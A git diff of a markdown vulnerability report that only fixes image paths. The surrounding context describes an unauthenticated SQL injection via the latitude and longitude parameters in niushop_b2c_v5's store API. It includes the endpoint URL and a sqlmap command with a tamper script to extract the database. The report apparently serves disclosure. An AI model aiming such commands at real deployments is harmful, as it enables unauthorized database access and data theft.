@@ -12,11 +12,11 @@ Injection parameters：latitude and longitude
 
 In the **getLocationStoreList** function in niushop_b2c_v5-master/niushop/app/model/store/Store.php, the native SQL statement concatenates $lnglat[ 'lng' ] and $lnglat[ 'lat' ].
 
-![image-20250218145237300](.\assets\image-20250218145237300.png)
+![image-20250218145237300](assets/image-20250218145237300.png)
 
 And niushop_b2c_v5-master/niushop/app/api/controller/Store.php calls this method.
 
-![image-20250218145245956](.\assets\image-20250218145245956.png)
+![image-20250218145245956](assets/image-20250218145245956.png)
 
 The vulnerability condition can be triggered without logging in.
 
@@ -26,8 +26,8 @@ https://127.0.0.1/api/store/page?latitude=1&longitude=1
 
 sqlmap --batch --tamper=space2comment -r post.txt -- current-db
 
-![image-20250218145310991](.\assets\image-20250218145310991.png)
+![image-20250218145310991](assets/image-20250218145310991.png)
 
-![image-20250218145317558](.\assets\image-20250218145317558.png)
+![image-20250218145317558](assets/image-20250218145317558.png)
 
-![image-20250218145332706](.\assets\image-20250218145332706.png)
+![image-20250218145332706](assets/image-20250218145332706.png)
